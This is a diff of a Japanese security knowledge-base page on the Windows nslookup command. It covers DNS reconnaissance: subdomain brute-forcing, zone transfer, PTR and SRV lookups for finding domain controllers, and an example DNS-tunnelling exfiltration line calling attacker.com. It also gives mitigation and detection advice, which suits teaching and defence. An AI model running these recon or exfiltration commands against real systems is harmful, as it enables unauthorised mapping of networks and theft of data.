@@ -1,16 +1,16 @@
 ---
-created: '2026-02-21'
-modified: '2026-02-21'
+created: 2026-02-21 08:41
+modified: 2026-02-22 09:30
 environment: [Network, OS/Windows]
 vulnearability: [Information_Disclosure, Reconnaissance]
 knowledge_category: Command
 tags:
-  - 'cmd'
-  - 'nslookup'
-  - 'dns'
-  - 'reconnaissance'
-  - 'information_gathering'
-  - 'knowledge_base'
+  - cmd
+  - nslookup
+  - dns
+  - reconnaissance
+  - information_gathering
+  - knowledge_base
 ---
 
 # Command - Windows - cmd - nslookup - DNS情報のクエリとデバッグ
@@ -18,6 +18,7 @@ tags:
 ## 概要
 
 `nslookup` (Name System Lookup) は、DNS (Domain Name System) サーバーに対してクエリを送信し、ドメイン名から IP アドレス、またはその逆の情報を取得するためのツールです。
+
 対話モードと非対話モードの2つのモードを持ち、Aレコードだけでなく MX (メール) や TXT (テキスト) など、あらゆる DNS レコードを確認できます。
 
 (出自: `Windows 標準搭載 - TCP/IP ユーティリティ`)
@@ -41,8 +42,6 @@ tags:
     REM 単語リストをループさせ、応答があったサブドメインのみを表示
     for /f %i in (subdomains.txt) do @nslookup %i.example.com 2>nul | findstr "Address" && echo %i.example.com found!
     ```
-
-
 
 ## スイッチ/オプション説明
 
@@ -94,7 +93,6 @@ tags:
         > ls -d example.com
         ```
 
-
 * **タスク 2: PTRレコード (逆引き) による内部探索**
     * **目的**: 特定の IP 範囲にどのような名前のサーバーがいるかを確認する。
     * **解説**: サーバー名に `dc01` や `backup-srv` といった名前が付いていれば、攻撃の優先順位を決められます。
@@ -128,10 +126,8 @@ tags:
     * **内部構造の特定**: サブドメインの列挙により、`dev`, `test`, `staging`, `vpn`, `backup` などの文字列から、組織のネットワーク構成、未公開のサービス、開発環境の所在を特定されます。
     * **ネーミングコンベンションの推測**: ホスト名（例: `TYO-DC-01`, `OSK-SQL-02`）から、拠点の場所、サーバーの役割、OSのバージョンなどが推測可能です。
     * **Active Directory の探索 (SRV Record)**: `_ldap._tcp.dc._msdcs.<Domain>` などの SRV レコードをクエリすることで、ドメインコントローラの IP アドレスを正確に特定でき、その後のパスワードスプレー攻撃や脆弱性調査の標的が定まります。
-
 * **DNS ゾーン転送 (AXFR) の悪用 (T1590.001):**
     * **悪用シナリオ**: 本来セカンダリ DNS サーバーとの同期に使用される `AXFR` 要求を攻撃者が送信。設定ミスで許可されている場合、そのドメイン内の**全ホスト名、IPアドレス、コメント、TXTレコード（クラウドサービスの認証トークンが含まれることもある）**を一度に窃取されます。
-
 * **DNS トンネリングとデータ漏洩 (Exfiltration Over DNS / T1048.003):**
     * **悪用シナリオ**: ほとんどのファイアウォールは DNS (UDP 53) を制限なく許可している点を利用します。攻撃者は、漏洩させたいデータをエンコード（Base64等）し、`nslookup <Encoded_Data>.attacker.com` のようにサブドメイン部分に含めてクエリを投げます。攻撃側の権威サーバーはこのログを解析することで、TCP接続を確立せずにデータを回収できます。
 
@@ -147,7 +143,6 @@ tags:
     * **ゾーン転送の制限**: ゾーン転送を許可する IP アドレスを、信頼できるセカンダリ DNS サーバーのみに厳格に制限する（`Allow-transfer { <Secondary_IP>; };`）。
     * **スプリットホライズン DNS (Split-DNS)**: 外部（インターネット）用と内部（イントラネット）用の DNS サーバーを分離し、外部から内部限定のホスト名（例: ファイルサーバーや AD）が解決されないように設計する。
     * **TXT レコードの整理**: 公開 DNS の TXT レコードに、古いサービスの設定や機密性の高いトークンが残っていないか定期的に監査する。
-
 * **Detection (検知)**:
     * **異常なクエリボリュームの監視**: 特定のソースから短時間に数千件のサブドメイン解決が行われている（DNS Bruteforce / Fuzzing）場合を検知する。
     * **クエリの長さと頻度の監視**: `A` や `TXT` レコードに対して、人間が読めない長いランダムな文字列が含まれるクエリ（DNS Tunneling）を SIEM で検知し、C2 通信を特定する。
